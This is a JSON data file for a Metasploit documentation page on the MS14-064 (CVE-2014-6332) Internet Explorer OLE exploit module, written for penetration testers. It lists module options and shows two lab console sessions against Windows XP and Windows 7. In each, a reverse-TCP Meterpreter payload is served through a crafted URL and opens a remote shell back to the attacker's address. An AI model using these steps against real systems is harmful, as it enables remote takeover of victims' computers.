{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/browser/ms14_064_ole_code_execution","result":{"data":{"moduleMetadataJson":{"id":"9642bc47-f3b6-5eb8-a1e9-46fee04c0aac","name":"MS14-064 Microsoft Internet Explorer Windows OLE Automation Array Remote Code Execution","fullname":"exploit/windows/browser/ms14_064_ole_code_execution","description":"This module exploits the Windows OLE Automation array vulnerability, CVE-2014-6332.\n        The vulnerability is known to affect Internet Explorer 3.0 until version 11 within\n        Windows 95 up to Windows 10, and no patch for Windows XP. However, this exploit will\n        only target Windows XP and Windows 7 box due to the Powershell limitation.\n\n        Windows XP by defaults supports VBS, therefore it is used as the attack vector. On other\n        newer Windows systems, the exploit will try using Powershell instead.","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/windows/browser/ms14_064_ole_code_execution","documentationSlug":"/modules/documentation/exploit/windows/browser/ms14_064_ole_code_execution","referencesSlug":"/modules/references/exploit/windows/browser/ms14_064_ole_code_execution"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits the Windows OLE Automation array vulnerability, <a href=\"https://www.cvedetails.com/cve/cve-2014-6332\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CVE-2014-6332</a>. The vulnerability is known to affect Internet Explorer 3.0 until version 11 within Windows 95 up to Windows 10, and no patch for Windows XP. However, this exploit will only target Windows XP and Windows 7 boxes. This is because from Windows 8 upward Internet Explorer blocks the payload from executing. Windows XP by defaults supports VBS, therefore it is used as the attack vector. On other newer Windows systems, the exploit will try using Powershell instead.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/browser/ms14_064_ole_code_execution</code></li>\n<li>Do: <code class=\"language-text\">Choose a payload and set any specific options</code></li>\n<li>Do: <code class=\"language-text\">run</code>, after a target browses to the generated URL, you should receive a session.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>TRYUAC</strong></p>\n<p>Ask victim to start as Administrator. This option only works on Windows 7 targets.</p>\n<p><strong>AllowPowershellPrompt</strong></p>\n<p>Allow exploit to try Powershell. If exploiting a Windows 7 target you need to enable this option.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-xp-pro-sp3-x86-with-ie-80600118702\" style=\"position:relative;\"><a href=\"#windows-xp-pro-sp3-x86-with-ie-80600118702\" aria-label=\"windows xp pro sp3 x86 with ie 80600118702 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows XP Pro SP3 x86 with IE 8.0.6001.18702</h3>\n<p>The attacker's IP is <code class=\"language-text\">192.168.2.3</code> and the victim's IP is <code class=\"language-text\">192.168.2.207</code>. </p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/browser/ms14_064_ole_code_execution\nmsf exploit(ms14_064_ole_code_execution) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(ms14_064_ole_code_execution) &gt; set LHOST 192.168.2.3\nLHOST =&gt; 192.168.2.3\nmsf exploit(ms14_064_ole_code_execution) &gt; run\n[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 192.168.2.3:4444\nmsf exploit(ms14_064_ole_code_execution) &gt; [*] Using URL: http://0.0.0.0:8080/hGA1Ux\n[*] Local IP: http://192.168.2.3:8080/hGA1Ux\n[*] Server started.\n[*] 192.168.2.207    ms14_064_ole_code_execution - Gathering target information for 192.168.2.207\n[*] 192.168.2.207    ms14_064_ole_code_execution - Sending HTML response to 192.168.2.207\n[*] 192.168.2.207    ms14_064_ole_code_execution - Sending exploit...\n[*] 192.168.2.207    ms14_064_ole_code_execution - Sending VBS stager\n[*] Sending stage (957487 bytes) to 192.168.2.207\n[*] Meterpreter session 1 opened (192.168.2.3:4444 -&gt; 192.168.2.207:1299) at 2017-03-01 19:07:12 +0100\n\nmsf exploit(ms14_064_ole_code_execution) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; sysinfo\nComputer        : MACHINE\nOS              : Windows XP (Build 2600, Service Pack 3).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"windows-7-pro-sp1-x64-with-ie-80760117514\" style=\"position:relative;\"><a href=\"#windows-7-pro-sp1-x64-with-ie-80760117514\" aria-label=\"windows 7 pro sp1 x64 with ie 80760117514 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 7 Pro SP1 x64 with IE 8.0.7601.17514</h3>\n<p>The attacker's IP is <code class=\"language-text\">192.168.2.3</code> and the victim's IP is <code class=\"language-text\">192.168.2.208</code>. Unlike on the Windows XP, target victim will see a popup dialog apear and they will have to allow the execution of the PowerShell script for the exploit to work. You need to set <code class=\"language-text\">AllowPowershellPrompt</code> option to <code class=\"language-text\">true</code> otherwise the exploit won't work on Windows 7.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/browser/ms14_064_ole_code_execution\nmsf exploit(ms14_064_ole_code_execution) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(ms14_064_ole_code_execution) &gt; set LHOST 192.168.2.3\nLHOST =&gt; 192.168.2.3\nmsf exploit(ms14_064_ole_code_execution) &gt; set AllowPowershellPrompt true\nAllowPowershellPrompt =&gt; true\nmsf exploit(ms14_064_ole_code_execution) &gt; run\n[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 192.168.2.3:4444\nmsf exploit(ms14_064_ole_code_execution) &gt; [*] Using URL: http://0.0.0.0:8080/6tdgNjLVij3zs\n[*] Local IP: http://192.168.2.3:8080/6tdgNjLVij3zs\n[*] Server started.\n[*] 192.168.2.208    ms14_064_ole_code_execution - Gathering target information for 192.168.2.208\n[*] 192.168.2.208    ms14_064_ole_code_execution - Sending HTML response to 192.168.2.208\n[*] 192.168.2.208    ms14_064_ole_code_execution - Sending exploit...\n[*] Sending stage (957487 bytes) to 192.168.2.208\n[*] Meterpreter session 1 opened (192.168.2.3:4444 -&gt; 192.168.2.208:49197) at 2017-03-01 19:35:12 +0100\n\nmsf exploit(ms14_064_ole_code_execution) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; sysinfo\nComputer        : WINDOWS7_X64\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9642bc47-f3b6-5eb8-a1e9-46fee04c0aac"}}}